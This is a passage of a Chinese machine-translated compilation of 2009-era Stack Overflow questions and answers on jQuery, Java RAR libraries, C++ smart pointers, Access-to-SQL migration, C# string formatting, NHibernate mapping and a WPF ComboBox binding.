你能提供更多信息吗？为什么要取消绑定事件处理程序？这是否只是为了防止再次单击并获得第二个 ajax 调用，而第一个仍在运行？如果是这样，我会采取不同的做法：将处理程序绑定到图像并将它们绑定。如果有人单击图像，则会调用您的处理程序。然后处理程序启动一个ajax 请求并设置一个标志（例如loading = true）。如果再次单击图像，只要加载为真，该函数就会忽略它。如果请求完成，您将加载标志重置为 false。

这种技术经常被使用并且应该比遍历 DOM、查找元素绑定事件处理程序等更快。作为一个副作用，您现在有一个加载标志，可用于在加载时显示一个 throbber。

# java - 使用java的RAR档案

> ID：561107
> 
> 赞同：22
> 
> 时间：2009-02-18T13:50:39.590
> 
> 标签：java, archive, rar

有没有人可以推荐的用于操作 RAR 存档文件的好的 Java API？谷歌搜索并没有发现任何令人信服的东西。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2009-02-18T13:58:56.497

您可以尝试[JUnRar](https://github.com/edmund-wagner/junrar)，“用纯 Java 实现的 RAR 处理 API”（引用该站点）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2011-09-15T16:03:46.750

SF 也有这个分叉（@Fabian 的回答，这个是从一个旧的 SF 项目分叉的）：

[https://github.com/jukka/java-unrar](https://github.com/jukka/java-unrar)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-29T12:52:42.230

我想这会对你有所帮助。

[内窥镜](http://code.google.com/p/raroscope/)

用于扫描和枚举 RAR 归档内容的纯 Java 库

# jsp - 在 Display 标记中，在 display:column 标记中提供属性时，该属性将打印为列。我应该怎么做才能打印与一行相同的内容？

> ID：561108
> 
> 赞同：0
> 
> 时间：2009-02-18T13:50:58.763
> 
> 标签：jsp, displaytag

在 jsp 中，我使用 Display 标签来打印表格。在显示表标记中，在 display:column 标记中提供属性时，该属性将打印为列。我应该怎么做才能打印与一行相同的内容？

为了清楚起见，我举个例子：

```
<display:table name="test">
  <display:column property="id" title="ID" />
  <display:column property="name" />
</display:table> 
```

结果将是：

ID 名称
1 Foo
2 酒吧

但我希望它像这样按行显示：

ID 1 2
名称 Foo Bar

如何使用显示表标签来做到这一点？任何帮助将非常感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T14:02:38.173

除非他们在过去几个月里做出了一些重大改变（我对此表示怀疑），否则这不能用显示标签来完成。

查看[http://displaytag.sourceforge.net/1.2/](http://displaytag.sourceforge.net/1.2/)以获取有关显示标签的更多信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-10-20T00:47:04.213

抱歉，display:table 没有 display:row 类型标签。

您是否提前知道要显示多少列？如果是这样，您也许可以调整对象模型以旋转它，然后可以让 displaytag 写出您想要的表格。

如果没有，您可能需要重新考虑您的水平设计，因为显示器只有这么宽。

您是否打算在绘制许多列时将其包裹起来？如果是这样，那么 html 表格可能不会成为您最好的显示机制。

# c# - 如何复制 C# 中另一个进程正在使用的文件

> ID：561111
> 
> 赞同：0
> 
> 时间：2009-02-18T13:51:38.417
> 
> 标签：c#

如何使用当前正在被另一个进程使用的文件？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-18T13:54:30.673

如果文件以共享权限打开，那么您应该能够使用它。另一方面，如果进程以非共享权限打开文件，则在相关进程释放文件之前，您无法访问它。

如果您拥有相关进程，则可以通过以下方式打开文件来启用读取共享。

```
using (var file = new FileStream(
   @"C:\path\to\file.txt", 
   FileMode.Open, 
   FileAcces.Read, 
   FileShare.Read) {
  // ...
} 
```

那里的重要参数是 FileShare.Read

# sql-server - 如何在 SQL Server Reporting Services 中为“左连接”建模？

> ID：561114
> 
> 赞同：1
> 
> 时间：2009-02-18T13:53:00.787
> 
> 标签：sql-server, reporting-services

我是报告 svcs 的新手，我正在编写基于在 VS.NET 2008 中创建的报告模型 (.smdl) 的报告。我似乎错过了报告生成器查询视图与“左连接”的模拟。模型很简单：

三个实体： Cust (custid, custname) Ord (ordid, custid, orddate, ...) Charge (chargeid, ordid, chargetype, chargevalue...)

将“费用”视为与订单相关的可选费用（特殊费用）——有些订单有，有些没有。

模型是从视图 (.dsv) 中自动生成的，该视图准确地指示了 cust 和 ord 之间以及 ord 和 charge 之间的关系。我注意到，在设计视图关系时，没有任何选项可以指示（例如）该关系应被视为“左连接”。

现在我跳到 Report Builder 2 (RB2) 来设计一个基于这个模型的报表。我的目标是简单地列出每个订单：客户姓名、订单日期、收费类型、收费值（即，如果订单行有多个收费类型，则会重复）。我希望列出所有订单，即使订单没有任何费用——我认为这是传统意义上的“左连接”。

我使用 RB2 的查询设计器创建数据集，并且仅选择（即双击）我想要的实体作为报告中的字段：custname、orddate、chargetype、chargeval。然后我根据这个数据集在报表中创建一个简单的表。

运行报告时，我只收到那些实际收费的订单。我宁愿希望得到所有的订单。有没有办法可以指定？

谢谢你，比尔道森

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-24T16:36:34.150

我通过 Sql Server 论坛得到了答案：

[http://social.msdn.microsoft.com/Forums/en-US/sqlreportingservices/thread/20d4b4fd-dc0b-428e-a5b8-aedf5c53d340](http://social.msdn.microsoft.com/Forums/en-US/sqlreportingservices/thread/20d4b4fd-dc0b-428e-a5b8-aedf5c53d340)

来自 Aaron Meyers 的相关部分：

> 这里的关键是所有报表模型查询都以“基础实体”为中心，并且报表中详细信息级别的每一行都代表该基础实体中的一行。您可能会注意到，在您的模型中，没有实体对应于“订单的费用，或者只有订单（如果没有费用）”。您需要根据 DSV 中的命名查询在模型中显式创建此 Order-Charge 实体。这个命名查询可以只从 Ord 表和 Charge 表中选择键，并在两者之间使用 LEFT OUTER JOIN。然后创建从这些键到 Ord 和 Charge 表的关系，并更新模型（右键单击模型根节点并自动生成）。
> 
> 当您从 Ord 的详细信息开始并通过新角色导航到 Charge 并选择其他详细信息时，报表生成器将选择 Order-Charge 实体作为报表的根/基本实体。
> 
> 我们正在考虑未来版本的功能，以允许直接在报表生成器中创建这些类型的查询，而无需模型设计器显式创建 LEFT OUTER JOIN 实体。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-26T02:44:18.973

我相信左连接是根据您将字段添加到查询设计器画布上的顺序发生的。只要您添加客户字段，然后是订单字段，然后是费用字段，您应该是对的。

您可以验证使用 SQL Profile 运行的实际查询，这对于调试这些事情非常方便。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-09-08T12:57:18.510

我们可以通过使用实体角色的基数属性在两个实体之间的报表模型中实现 LEFT JOIN。

例如，假设我们有两个实体 Customer 和 Order。

Customer-->Order 角色应该有 Optional One(source)-->Optional Many(Target) {Because 1 customer can have 0 or many Orders}

Order-->Customer 角色应该有 Optional Many(source)-->Optional One(Target) {反之亦然}

# c++ - 为智能指针编写复制构造函数时出现问题

> ID：561115
> 
> 赞同：4
> 
> 时间：2009-02-18T13:53:40.457
> 
> 标签：c++, smart-pointers

我正在使用的代码有自己的智能指针实现，它执行简单的引用计数。是的，我们不应该有自己的实现。是的，我们应该使用 boost 中的一个或类似的。忍受我。

我发现我想写这样的代码：

```
...
CountedPointer<Base> base;
...
CountedPointer<Derived> derived;
...
base = derived; 
```

但是，CountedPointer 的复制构造函数有一个这样的原型：

```
CountedPointer(const CountedPointer<T> &other); 
```

所以上面的代码无法编译，因为它找不到合适的构造函数（或赋值运算符 - 那里是同样的故事）。我尝试用这样的原型重写复制构造函数：

```
template<U>
CountedPointer(const CountedPointer<U> &other); 
```

但是，我遇到了一个问题，即复制构造函数必须访问它正在复制的对象的私有成员（即原始指针），如果它位于不同的 CountedPointer 特化中，它们是不可见的。

Alexandrescu 在他的[Loki](http://loki-lib.sourceforge.net/)库中通过封装指针的访问器函数避免了这个问题，但如果可能的话，我不希望直接访问原始指针。

有什么办法可以写这个来允许派生到基本副本，但不允许一般访问原始指针？

**更新：** 我已经实现了下面接受的答案，并且效果很好。当我只提供复制构造函数的模板版本，替换原始的未模板版本时，我花了一段时间弄清楚为什么我的程序会出现可怕的段错误。最终，我意识到编译器并不将模板版本视为复制构造函数，而是提供了一个默认版本。默认的只是愚蠢地复制内容而不更新计数器，所以我最终得到了悬空指针和双重释放。同样的事情也适用于赋值运算符。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-18T14:08:58.190

你不能让他们成为朋友吗？像：

```
template<typename T>
class CountedPointer {

    // ...

    template<U>
    CountedPointer(const CountedPointer<U> &other);

    template<typename U> friend class CountedPointer;
}; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-18T14:02:14.180

“Alexandrescu 通过封装指针的访问器函数在他的库 Loki 中避免了这个问题，但如果可能的话，我不希望直接访问原始指针”

我认为添加原始指针获取器的成本将远低于试图绕过没有原始访问的复杂性成本。只是没有一种语言机制可以在两个不相关的模板类之间转换实例。对于编译器来说，它们是两个完全不同的东西，在运行时没有任何关系。这就是为什么您的一个模板类实例无法访问其他私人的原因。

您可以考虑使用所有 CountedPointers 的基类创建这种关系。您可能必须在此基类中放置一个 void*。然后你必须自己做所有检查（T是从U派生的然后强制强制转换......我可以隐式地将T转换为U吗？如果是强制转换......等等）但这可能会变得非常复杂. 这是这种方法的一个粗略的开始：

```
class CountedPointerBase
{
    void* rawPtr;
};

template <class T>
class CountedPointer : public ConutedPointerBase
{
      T* myRawT = reinterpret_cast<T*>(rawPtr);

      template<class U>
      CountedPointer( CountedPointer<U> u)
      {
           // Copying a CountedPointer<T> -> CountedPointer<U>
           if (dynamic_cast<U*>(myRawT) != NULL)
           {
               // Safe to copy one rawPtr to another
           }
           // check for all other conversions
      }
} 
```

查看两种类型是否兼容可能还有很多其他复杂性。也许有一些 Loki/Boost 模板的灵巧性可以确定两个类型参数是否可以转换为另一个。

无论如何，正如您所看到的，这可能是一个比添加吸气剂更复杂的解决方案。能够获得原始指针还有其他好处。例如，您可以将原始指针传递给只接受原始指针的库函数，并将它们用作临时指针。我想，如果您团队中的某个人决定保留原始指针的副本而不是智能指针，这可能很危险。那个人可能应该立即被打鳟鱼。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-18T14:13:58.317

如果你有一个 CountedPointer(T* other); 你会解决这个问题。构造函数和类似的赋值运算符。

# sql - 如何将 Access 数据库转换为 SQL？

> ID：561117
> 
> 赞同：2
> 
> 时间：2009-02-18T13:54:04.950
> 
> 标签：sql, database, ms-access, phpmyadmin

我想将我的 Access 数据库转换为 SQL，因为我的主机只支持在他们的 phpmyadmin 中通过 SQL 导入数据库。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-18T14:01:34.323

嗯，我不认为 Access 有能力生成 SQL 来创建它的表和数据。我可以建议将其导入 SQL Server（任何版本都应该这样做），然后使用 SQL Server 生成创建表和数据脚本。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-18T14:03:44.427

下载 SQL Server 2005 Express 之类的免费使用的东西，然后将其导入其中，然后生成 SQL

[http://www.microsoft.com/Sqlserver/2005/en/us/express.aspx](http://www.microsoft.com/Sqlserver/2005/en/us/express.aspx)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-11-10T21:43:44.220

我在两个单独的项目中使用了[Bullzip Access To MySQL](http://www.bullzip.com/products/a2m/info.php)，发现它非常可靠。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-02-18T14:06:25.887

因为您服务器上的数据库是 MySQL，所以我会：

1.  在本地机器上安装 MySql
2.  将 ODBC 连接到 MySQL 数据库
3.  从访问打开的 MySQL 数据库（作为 ODBC 资源）并将数据复制到它
4.  从 MySQL 导出数据

这是很长的路要走，但它最有可能正常工作。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-02-18T14:07:11.110

您使用的是哪个版本的 Access？您需要将所有 Access 表导出为 CSV 文件，并将每个表导入 mySQL。现在可能有一些工具可以自动执行此操作，但它们可能会破坏您的数据或您拥有的任何 PK 和 FK 映射。IMO 逐表执行以确保数据完整性的最佳方式。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2011-01-08T01:07:03.493

你是说MySQL吗？这是一个数据库实现。“SQL”是一种用于查询和修改关系数据库的语言。Microsoft Access 支持 SQL 语言。像大多数标准一样，SQL 标准在不同的数据库系统上有不同的实现！

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-12-23T06:15:53.090

您不妨试试迁移工具 ( [http://support.microsoft.com/kb/237980](http://support.microsoft.com/kb/237980) )

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2011-11-28T16:38:16.180

恕我直言，最好的方法是结合一些/大部分已发布的答案。

下载快速版本的 SQL Server 并让它在您的 PC 上运行。[从http://www.microsoft.com/sqlserver/en/us/product-info/migration.aspx](http://www.microsoft.com/sqlserver/en/us/product-info/migration.aspx)下载 SSMA（SQL Server 迁移助手）

这将处理您可能需要/可能不需要的数据类型的各种更改。

然后，一旦迁移了所有内容，您就可以从 phpMyAdmin 自由连接到您的 SQL 服务器 epxress 实例

我实际上正在做一些合同工作 atm 将 Access DB 迁移到 SQL，这是我采取的路线，发现它非常简单和健壮

# jquery - 在 jquery 中，匹配第一个下一个元素

> ID：561120
> 
> 赞同：3
> 
> 时间：2009-02-18T13:54:57.630
> 
> 标签：jquery

我有一个 href 标签，旁边是一个**标签。我想在粗体标签之间放置新文本。**

 **```
<a href=""></a> <b>old text</b> 
```

那么在我的点击处理程序中，我怎样才能获得对粗体标记之间文本的引用？

我知道有 $(this + b) 但我如何确保它只获取第一个而不是所有下一个项目（如在 jquery 示例中）。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2010-04-30T09:49:55.480

尽管 Magnar 的答案已被标记为已接受，但它实际上并没有回答原始问题（必然）。从搜索中找到此问题时，这是一个问题。也许这个问题需要重新措辞。无论如何，我的观点是，如果在“a”和“b”之间有另一个元素，这将失败。要*真正*匹配“第一个，下一个”元素，请使用：

```
$('a').nextAll('b:first') 
```

请注意，Tim Büthe 的答案也是不正确的（它可能与之前的兄弟姐妹相匹配）。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-02-18T13:59:00.380

使用以下命令获取 b-tag：

```
$(this).next(); 
```

使用以下命令获取 b-tag 中的文本：

```
$(this).next().text(); 
```

并将 b-tag 内的文本设置为：

```
$(this).next().text("Something new"); 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-02-18T14:57:40.880

你也可以这样做：

```
$(this).siblings(":first").text("Something new"); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-02-18T17:52:36.793

只需添加，将所有这些都保存在您的工具箱中，它们在遍历时都非常方便，它们都可以接受选择器（#myid、.myclass 等）和过滤器（:visible、:first、:odd 等）

```
.parent()
.sibling()
.children()
.next()
.prev() 
```

# c# - 我可以在不指定数字的情况下将参数传递给 String.Format 吗？

> ID：561125
> 
> 赞同：5
> 
> 时间：2009-02-18T13:56:48.717
> 
> 标签：c#, .net, string, formatting

有没有一种方法可以`String.Format`发送消息而无需指定`{1}, {2},`等？是否有可能有某种形式的自动增量？（类似于普通的旧`printf`）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-18T14:01:09.940

您可以使用[命名字符串格式化](https://stackoverflow.com/questions/159017/named-string-formatting-in-c)解决方案，这可能会解决您的问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-18T13:59:27.633

不怕——它会将对象放入字符串中的什么位置？使用 printf，您仍然需要在某处放置说明符。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-02-27T21:09:41.327

我认为最好的方法是传递属性名称而不是数字。使用此方法：

```
using System.Text.RegularExpressions;
using System.ComponentModel;

public static string StringWithParameter(string format, object args)
    {
        Regex r = new Regex(@"\{([A-Za-z0-9_]+)\}");

        MatchCollection m = r.Matches(format);

        var properties = TypeDescriptor.GetProperties(args);

        foreach (Match item in m)
        {
            try
            {
                string propertyName = item.Groups[1].Value;
                format = format.Replace(item.Value, properties[propertyName].GetValue(args).ToString());
            }
            catch
            {
                throw new FormatException("The string format is not valid");
            }
        }

        return format;
    } 
```

想象一下，您有一个学生类，其属性如下：Name、LastName、BirthDateYear，并像这样使用它：

```
 Student S = new Student("Peter", "Griffin", 1960);
 string str =  StringWithParameter("{Name} {LastName} Born in {BithDate} Passed 4th grade", S); 
```

你会得到： 1960 年出生的彼得格里芬通过了四年级。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-18T14:01:14.930

[这里](http://www.codeproject.com/KB/printing/PrintfImplementationinCS.aspx)有一个 printf 的 C# 实现

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-02-18T14:14:34.573

人们总是可以使用这种（未经测试的）方法，但我觉得它过于复杂：

```
public static string Format(char splitChar, string format,
                            params object[] args)
{
    string splitStr = splitChar.ToString();
    StringBuilder str = new StringBuilder(format + args.Length * 2);
    for (int i = 0; i < str.Length; ++i)
    {
        if (str[i] == splitChar)
        {
            string index = "{" + i + "}";
            str.Replace(splitStr, index, i, 1);
            i += index.Length - 1;
        }
    }

    return String.Format(str.ToString(), args);
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-01-24T09:22:52.587

我想出了这个，这有点麻烦，但它适用于我需要做的事情，即以与使用 WriteLine 相同的方式将变量数或参数传递给我自己的函数。我希望它可以帮助某人

```
protected void execute(String sql, params object[] args)
{
    for (int i = 0; i < args.Count(); i++ )
    {
        sql = sql.Replace(String.Format("{{{0}}}", i), args[i].ToString());
    }
    //...
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-07-04T10:27:44.067

如果有人感兴趣，我已经修改了 Ashkan 的解决方案，以便能够在 WinRT 下运行它：

```
/// <summary>
/// Formats the log entry.
/// /// Taken from:
/// http://stackoverflow.com/questions/561125/can-i-pass-parameters-to-string-format-without-specifying-numbers
/// and adapted to WINRT
/// </summary>
/// <param name="format">The format.</param>
/// <param name="args">The arguments.</param>
/// <returns></returns>
/// <exception cref="System.FormatException">The string format is not valid</exception>
public static string FormatLogEntry(string format, object args)
{
    Regex r = new Regex(@"\{([A-Za-z0-9_]+)\}");

    MatchCollection m = r.Matches(format);

    var properties = args.GetType().GetTypeInfo().DeclaredProperties;

    foreach (Match item in m)
    {
        try
        {
            string propertyName = item.Groups[1].Value;
            format = format.Replace(item.Value, properties.Where(p=>p.Name.Equals(propertyName))
                .FirstOrDefault().GetValue(args).ToString());
        }
        catch
        {
            throw new FormatException("The string format is not valid");
        }
    }

    return format;
} 
```

# c# - 如何在 VS 中添加一组标准的“使用”语句？

> ID：561132
> 
> 赞同：5
> 
> 时间：2009-02-18T13:59:14.657
> 
> 标签：c#, visual-studio-2008

我有 Visual Studio 2008，我发现自己不断地在我创建的每个文件中添加相同的 3 或 4 个语句......包括被添加？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-18T14:05:18.353

您可以根据需要创建一个与您想要的模板相匹配的模板

[http://msdn.microsoft.com/en-us/magazine/cc188697.aspx](http://msdn.microsoft.com/en-us/magazine/cc188697.aspx)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-18T14:04:46.217

您可以通过编辑 Visual Studio 项模板来实现。

更多信息[在这里](http://visualstudiomagazine.com/columns/article.aspx?editorialsid=2761)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-18T14:29:55.377

如果您想更改 Visual Studio 附带的内置模板，而不是创建自己的派生类，您可以尝试更新周围的文件`C:\Program Files (x86)\Microsoft Visual Studio 9.0\Common7\IDE\ItemTemplates`（尽管您可能还需要更新`ItemTemplatesCache`文件夹以立即获取更改）。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2009-02-18T14:31:49.040

这不会直接回答您的问题，但您应该看看 ReSharper。由于各种原因，它是一个很好的工具。但它特别做的一件事是自动为您添加（和删除）所有使用指令的人，因此您甚至不必考虑它。

# c# - ASP.NET 图表和用户控制输出缓存

> ID：561133
> 
> 赞同：1
> 
> 时间：2009-02-18T13:59:21.817
> 
> 标签：c#, asp.net, caching, outputcache

我在用户控件中使用新的 asp.net 图表控件。我尝试使用输出缓存指令将用户控件缓存 30 秒。缓存是自定义的，具体取决于登录的用户。

缓存控件时图表数据丢失。我每 30 秒看到一次图表，但中间没有任何时间。我是否缺少一些用于 asp.net 图表控件的缓存选项？

谢谢，

马丁。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-18T16:15:44.343

[我想我会添加我的评论作为答案，以防它回答您的问题]

您正在使用 <% @OutputCache ... %> 页面指令？如果是这样，则缓存页面的输出（即 html），并且在缓存到期之前不会检索数据源或再次绑定数据。如果您想缓存图表的数据源，则需要在代码隐藏中执行此操作：

缓存参考： http: [//msdn.microsoft.com/en-us/library/18c1wd61 (VS.80).aspx](http://msdn.microsoft.com/en-us/library/18c1wd61(VS.80).aspx)

将项目添加到缓存：http: [//msdn.microsoft.com/en-us/library/system.web.caching.cache.add.aspx](http://msdn.microsoft.com/en-us/library/system.web.caching.cache.add.aspx)

从缓存中检索：http: [//msdn.microsoft.com/en-us/library/system.web.caching.cache.item.aspx](http://msdn.microsoft.com/en-us/library/system.web.caching.cache.item.aspx)

这有帮助吗，还是我不在基地？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2010-06-24T13:56:27.783

您可以将 ImageStorageMode 属性设置为 UseImageLocation。您可以在[此处](http://msdn.microsoft.com/en-us/library/dd456629.aspx)找到有关图像文件管理的更多信息。

# seo - 为什么在 URL 中使用页面标题？

> ID：561134
> 
> 赞同：1
> 
> 时间：2009-02-18T13:59:27.260
> 
> 标签：seo, search-engine, friendly-url

> 为什么有些网站，大多数博客，在 url 中使用帖子的标题？如：
> 
> > [http://www.geek.com.br/blogs/832697632/posts/9360-uni-o-europ-ia-pretende-apoiar-conex-o-universal-para-celulares](http://www.geek.com.br/blogs/832697632/posts/9360-uni-o-europ-ia-pretende-apoiar-conex-o-universal-para-celulares)
> 
> 这会改善谷歌索引吗？

**编辑：这是[为什么有些网站会在 URL 的末尾添加“Slugs”的副本？](https://stackoverflow.com/questions/47427/why-do-some-websites-add-slugs-to-the-end-of-urls)**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-18T14:02:04.947

也使它非常具有人类可读性。您可以看到一个链接并知道内容会是什么样子。而数字没有任何意义。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T14:05:38.040

根据 Robin 的说法，不仅 _human_readable，而且**搜索引擎**可读

在您的 url 中使用页面标题非常好，因为 Google、Yahoo 等使用它作为关键字。

# c# - 这种情况如何做ORM？

> ID：561137
> 
> 赞同：1
> 
> 时间：2009-02-18T14:00:37.053
> 
> 标签：c#, vb.net, nhibernate, hibernate

我有以下两个表（SQL Server）：

```
**IndexValues**
IdIndexValue int (PK)
Value varchar(2000)
IdIndex int (FK for Table Indexes)
IdDocument int (FK for Table Documents)

**IndexValuesLists**
IdIndexValueList int (PK)
IdIndexValue int (PK with IdIndexValueList, FK for Table Indexes) 
```

稍微解释一下，第二个表将第一个表中的项目分组。一个文档可以在第二个表中有各种“组项目”。我有以下 BusinessObjects 类：

```
IndexValue {
int Id;
string Value;
Document Document;
Index Index;
}

IndexValueList {
int Id;
Document Document;
List<List<IndexValue>> IndexesValues;
} 
```

我不知道如何为最后一个属性进行映射。如何在 hbm.xml 上做到这一点？

**编辑**：做一个例子来解释更多我需要什么：

**索引值行：**

```
IdIndexValue / Value / IdIndex / IdDocument

1, "A", 10, 500
2, "Circle", 11, 500
3, "John", 12, 500

4, "B", 10, 500
5, "Square", 11, 500
6, "Mary", 12, 500 
```

=======================

**IndexValuesLists 行：**

```
IdIndexValueList  / IdIndexValue

1, 1
1, 2
1, 3
2, 4
2, 5
2, 6 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T14:20:30.173

List-of-lists 看起来不像 NHibernate 开箱即用的那种东西。（如果真的对您来说意义重大，当然，您可以自由地自己实现对这种场景的支持。）

比这更深，你的领域模型似乎有点太奇怪了。为什么你有一个索引值列表？也许您需要一个具有索引值列表的新域实体，并用这个新域实体的列表替换列表列表？

# c# - 如何使用 c# 在 SQL Server 2000 中添加二维数组

> ID：561138
> 
> 赞同：0
> 
> 时间：2009-02-18T14:00:49.037
> 
> 标签：c#, sql-server

我想使用 c# 在 sql server 2000 中添加二维数组。但问题是sql中没有数组数据类型。请帮助我如何在 sql server 中添加二维数组。感谢您查看我的问题...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-18T14:23:29.403

二维数组本质上是一个`table`. 所以你需要在你的数据库中添加一个表来保存这个数组。如果您需要保存多个数组实例，而不是添加一个额外的列来存储单个数组共有的键。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-05T15:20:26.890

*正如当前接受的答案所说，***您不需要为每个维度创建一个额外的列。***这都是关于*序列化*的。*

 *1.  在 SQL Server 中创建一个 Image 类型的列来存储 n 维数组。如果您使用的是 SQL Server 2005 或更高版本，请使用 VARBINARY(MAX) 而不是 Image。
2.  在 C# 中，序列化您的 n 维数组，以便您可以将其作为一维数组 (byte[]) 处理
3.  将序列化数据保存到 Image 字段中。

当然，当你需要从数据库中获取信息时，你会得到一个字节数组。然后您需要将其反序列化为您的原始类型（n 维数组）。

**需要一个例子吗？**

看看这个类似的问题，我在其中发布了一个使用 varbinary 字段执行此操作的示例。它在 SQL 2000 中应该非常相似。

[https://stackoverflow.com/a/11334237/354756](https://stackoverflow.com/a/11334237/354756)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-18T14:04:10.120

数据库字段用于存储**单个**数据项。任何数据结构都必须映射到数据库中的列和表——而不是添加到单个数据库字段。

你存储的是什么类型的数据？如果您想对数组的单个项目进行任何类型的索引或搜索，那么您最好提出一个数据库设计来反映您正在建模的数据（因此笛卡尔坐标数组 mgiht 映射到包含 x、y 和 z 列的表）。

如果这是为了简单地存储一些数据以供以后检索，那么您可以将其添加为 BLOB 字段，然后对其进行序列化和反序列化。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-18T15:06:12.233

不知道您要完成什么，因为您没有提供任何详细信息，但请查看[SQL Server 2005 中](http://www.sommarskog.se/arrays-in-sql-2005.html)的数组和列表 或SQL Server[中的数组和列表（SQL 2000 及更早版本）](http://www.sommarskog.se/arrays-in-sql-2000.html)

# html - DIVS 相对于表格的优势是什么？

> ID：561154
> 
> 赞同：0
> 
> 时间：2009-02-18T14:03:43.863
> 
> 标签：html

我很好奇使用 DIV 相对于表格的所有优势是什么，反之亦然。

谢谢， XaiSoft

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-18T14:06:10.817

这个问题被问了很多。看看这些：

[为什么不在 HTML 中使用表格进行布局？](https://stackoverflow.com/questions/83073/div-vs-table)

[DIV 与表格或 CSS 与愚蠢](https://stackoverflow.com/questions/61250/divs-vs-tables-or-css-vs-being-stupid)

[另一个 div 与表格的问题：表格](https://stackoverflow.com/questions/339210/yet-another-divs-vs-tables-question-forms)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T14:07:34.167

这是另一个：
[表格而不是 DIV](https://stackoverflow.com/questions/30251/tables-instead-of-divs/30271)

总结所有这些链接：

它不是 div 与表，而是*语义*与表。Div*和*表格（使用*得当*）都只是语义布局的一小部分。

使用良好的语义布局有很多原因。其中大多数归结为支持“边缘”浏览器，但您可能会惊讶于其中有多少：

*   屏幕阅读器和其他可访问的浏览器（如果您为美国政府工作，您的网站*必须*使用这些）
*   移动浏览器（智能手机）
*   较旧的浏览器（IE6 和更早版本，netscape 4.x 和更早版本）。那里仍然有很多IE6。
*   **谷歌**会更好地索引和排名语义布局，而谷歌机器人只是另一种浏览器。

此外，您将更好地将内容与功能分离，从而更容易在单独的设计师和程序员之间维护网站

# c# - Empty Workingset

> ID：561157
> 
> 赞同：0
> 
> 时间：2009-02-18T14:03:56.453
> 
> 标签：c#, winforms

is using empty working set or forcing GC collects a recommended practices in trying to reduce memory versus performance. is there any articles or best practices to help understand the implications of using this functions

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T14:07:53.293

Not pestering those functions is definitely a good practice. GC is smart enough when it comes to collecting garbage and will promptly release all the unused memory it reserved previosly when asked to do so by the OS.

# c# - 将 WPF ComboBox 绑定到自定义列表

> ID：561166
> 
> 赞同：202
> 
> 时间：2009-02-18T14:06:14.047
> 
> 标签：c#, wpf, data-binding, mvvm, combobox

我有一个似乎没有更新 SelectedItem/SelectedValue 的组合框。

ComboBox ItemsSource 绑定到 ViewModel 类上的一个属性，该类将一堆 RAS 电话簿条目列为 CollectionView。然后我已经（在不同的时间）绑定`SelectedItem`或绑定`SelectedValue`到 ViewModel 的另一个属性。我在 save 命令中添加了一个 MessageBox 来调试数据绑定设置的值，但是`SelectedItem`/`SelectedValue`绑定没有被设置。

ViewModel 类看起来像这样：

```
public ConnectionViewModel
{
    private readonly CollectionView _phonebookEntries;
    private string _phonebookeEntry;

    public CollectionView PhonebookEntries
    {
        get { return _phonebookEntries; }
    }

    public string PhonebookEntry
    {
        get { return _phonebookEntry; }
        set
        {
            if (_phonebookEntry == value) return;
            _phonebookEntry = value;
            OnPropertyChanged("PhonebookEntry");
        }
    }
} 
```

_phonebookEntries 集合正在从业务对象的构造函数中初始化。ComboBox XAML 看起来像这样：

```
<ComboBox ItemsSource="{Binding Path=PhonebookEntries}"
    DisplayMemberPath="Name"
    SelectedValuePath="Name"
    SelectedValue="{Binding Path=PhonebookEntry}" /> 
```

我只对 ComboBox 中显示的实际字符串值感兴趣，而不是对象的任何其他属性，因为这是我在建立 VPN 连接时需要传递给 RAS 的值，因此`DisplayMemberPath`它们`SelectedValuePath`都是的 Name 属性连接视图模型。ComboBox`DataTemplate`应用于`ItemsControl`其 DataContext 已设置为 ViewModel 实例的 Window 上。

